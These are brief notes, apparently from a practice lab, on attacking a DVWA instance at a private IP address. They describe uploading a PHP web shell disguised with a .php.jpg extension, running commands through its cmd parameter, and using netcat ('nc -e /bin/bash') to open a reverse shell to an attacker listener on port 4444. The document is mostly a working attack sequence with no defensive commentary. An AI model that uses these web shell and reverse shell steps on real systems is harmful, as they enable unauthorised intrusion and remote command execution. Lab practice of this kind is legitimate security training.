# convert php shell to php.jpg 
# upload this file on web  
http://192.168.56.118/dvwa/hackable/uploads/labshell.php.jpg?cmd=id
# in terminal put
nc -lvnp 4444
# on get browse
http://192.168.56.118/dvwa/hackable/uploads/labshell.php.jpg?cmd=nc%20-e%20/bin/bash%20192.168.56.112%204444
